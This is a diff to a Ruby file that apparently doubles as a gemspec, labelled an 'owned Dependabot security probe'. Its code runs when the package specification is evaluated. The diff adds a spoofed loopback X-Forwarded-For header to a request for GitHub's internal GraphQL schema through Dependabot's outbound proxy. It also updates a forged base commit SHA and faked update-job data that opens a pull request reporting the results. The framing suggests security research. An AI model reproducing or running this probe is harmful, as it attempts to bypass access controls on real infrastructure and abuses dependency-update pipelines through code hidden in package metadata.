@@ -10,8 +10,8 @@ require "uri"
 # three controlled workflow-run proof files.
 module OwnedDependabotNestedWorkflowScopeProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  FORGED_BASE_SHA = "a6103e8cfc1a3fb55ee800e03b493d119acf7202"
-  RAW_PATH = "vendor/owned-dependabot-internal-schema-get-control.txt"
+  FORGED_BASE_SHA = "0956642c7847fd597b6b619629b58a20a84e3c5a"
+  RAW_PATH = "vendor/owned-dependabot-internal-schema-xff-control.txt"
 
   module_function
 
@@ -47,6 +47,7 @@ module OwnedDependabotNestedWorkflowScopeProbe
     endpoint = URI("https://api.github.com/graphql")
     request = Net::HTTP::Get.new(endpoint.request_uri)
     request["GraphQL-Schema"] = "internal"
+    request["X-Forwarded-For"] = "127.0.0.1"
     response = proxy_client(endpoint).request(request)
     parsed = JSON.parse(response.body)
     types = parsed.dig("data", "__schema", "types") || []
@@ -84,8 +85,8 @@ module OwnedDependabotNestedWorkflowScopeProbe
       "data" => {
         "dependencies" => [{
           "name" => "owned_dependabot_nested_workflow_scope_probe",
-          "version" => "0.0.10",
-          "previous-version" => "0.0.9",
+          "version" => "0.0.11",
+          "previous-version" => "0.0.10",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
@@ -101,9 +102,9 @@ module OwnedDependabotNestedWorkflowScopeProbe
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: owned Dependabot internal-schema GET control",
-        "pr-title" => "Owned Dependabot internal-schema GET control",
-        "pr-body" => "Owned security test. GitHub's GET /graphql response contains schema metadata; the marker records only visibility booleans and an HTTP status from the real Dependabot outbound proxy. Result: #{JSON.generate(probe)}"
+        "commit-message" => "test: owned Dependabot internal-schema XFF control",
+        "pr-title" => "Owned Dependabot internal-schema XFF control",
+        "pr-body" => "Owned security test. GitHub's GET /graphql response contains schema metadata; the marker records only visibility booleans and an HTTP status from the real Dependabot outbound proxy with a loopback X-Forwarded-For control. Result: #{JSON.generate(probe)}"
       }
     }
   end
@@ -113,7 +114,7 @@ OwnedDependabotNestedWorkflowScopeProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.10"
+  spec.version = "0.0.11"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
